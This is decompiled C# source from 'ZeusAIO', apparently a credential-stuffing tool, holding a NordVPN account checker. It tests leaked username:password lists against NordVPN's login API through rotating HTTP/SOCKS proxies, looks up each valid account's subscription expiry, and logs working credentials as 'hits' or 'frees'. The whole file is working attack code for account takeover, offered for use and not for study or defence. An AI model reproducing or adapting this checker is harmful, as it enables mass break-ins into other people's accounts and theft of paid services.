// Decompiled with JetBrains decompiler
// Type: NordVpn.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Globalization;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace NordVpn
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.UserAgent = "NordApp android (playstore/2.8.6) Android 9.0.0";
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.AllowAutoRedirect = false;
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string input = httpRequest.Post("https://api.nordvpn.com/v1/users/tokens", "{\"username\":\"" + s[0] + "\",\"password\":\"" + s[1] + "\"}", "application/json").ToString();
              if (input.Contains("user_id\":"))
              {
                string str1 = Check.Base64Encode("token:" + Regex.Match(input, "token\":\"(.*?)\"").Groups[1].Value);
                httpRequest.Authorization = "Basic " + str1;
                string str2 = httpRequest.Get("https://zwyr157wwiu6eior.com/v1/users/services").ToString();
                string str3 = "Expiration Date: ";
                if (str2.Contains("expires_at"))
                {
                  foreach (JToken jtoken in (JArray) JsonConvert.DeserializeObject(str2))
                  {
                    if ((string) jtoken[(object) "service"][(object) "name"] == "VPN")
                    {
                      if (DateTime.UtcNow < DateTime.ParseExact(jtoken[(object) "expires_at"].ToString().Split(' ')[0], "yyyy-MM-dd", (IFormatProvider) CultureInfo.InvariantCulture))
                        str3 = "Expiration Date: " + jtoken[(object) "expires_at"].ToString().Split(' ')[0];
                      else
                        str3 = "Expired";
                    }
                  }
                }
                if (str3 != "Expired")
                {
                  ++mainmenu.hits;
                  if (mainmenu.p1 == "2")
                    Colorful.Console.WriteLine("[HIT - NORDVPN] " + s[0] + ":" + s[1] + " | " + str3, Color.Green);
                  Export.AsResult("/Nordvpn_hits", s[0] + ":" + s[1] + " | " + str3);
                  return false;
                }
                ++mainmenu.frees;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[FREE - NORDVPN] " + s[0] + ":" + s[1], Color.OrangeRed);
                Export.AsResult("/Nordvpn_frees", s[0] + ":" + s[1]);
                return false;
              }
              if (!input.Contains("code\":101301"))
              {
                if (input.Contains("message\":\"Unauthorized"))
                  break;
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
